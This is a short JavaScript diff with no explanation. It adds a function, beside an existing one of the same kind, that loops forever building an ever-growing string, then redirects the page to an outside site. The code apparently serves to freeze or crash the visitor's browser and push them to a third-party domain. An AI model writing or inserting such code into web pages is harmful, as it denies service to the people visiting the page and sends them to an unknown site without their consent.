@@ -30,3 +30,10 @@ function the1000(){
   while(0.433235123165132414)
     haaaa = haaaa += "b";
 }
+function justhhhh(){
+  theafsd = "c";
+  while (0.1) 
+    theafsd = theafsd += "c"
+ window.location.replace("https://altk.xyz/videos/")
+}
+  
